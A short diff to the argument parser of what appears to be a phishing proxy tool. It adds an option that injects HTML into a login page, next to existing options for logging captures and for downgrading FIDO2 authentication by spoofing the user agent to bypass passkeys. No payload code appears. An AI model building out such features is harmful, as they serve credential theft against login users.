@@ -131,6 +131,8 @@ def create_parser() -> Tuple[argparse.ArgumentParser, Dict[str, argparse.Argumen
         help='Log captures to file (JSONL)')
     deploy_local_parser.add_argument('--fido2-downgrade', action='store_true', default=False,
         help='Enable FIDO2 authentication downgrade (spoof UA to bypass passkey requirements)')
+    deploy_local_parser.add_argument('--html-injection', action='store_true', default=False,
+        help='Enable HTML injection into login page (captures browser capabilities and timing)')
     deploy_sub.add_parser('remote', help='Deploy to CloudFlare')
 
     # Status command
